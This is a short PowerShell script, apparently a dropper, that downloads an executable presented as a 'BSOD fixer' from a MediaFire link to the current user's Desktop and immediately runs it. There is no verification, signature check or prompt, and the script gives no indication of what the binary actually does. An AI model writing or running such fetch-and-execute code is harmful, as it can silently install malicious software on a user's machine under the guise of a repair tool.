#The Download Script
$uri = "http://download1322.mediafire.com/0bdcu8haf2rg/d76ppqzsc3spw8c/BSOD+fixer+by+Kresten.exe"
$out = "c:\Users\$env:UserName\Desktop\BSODFixer by Kresten.exe"
Invoke-WebRequest -Uri $uri -OutFile $out
& $out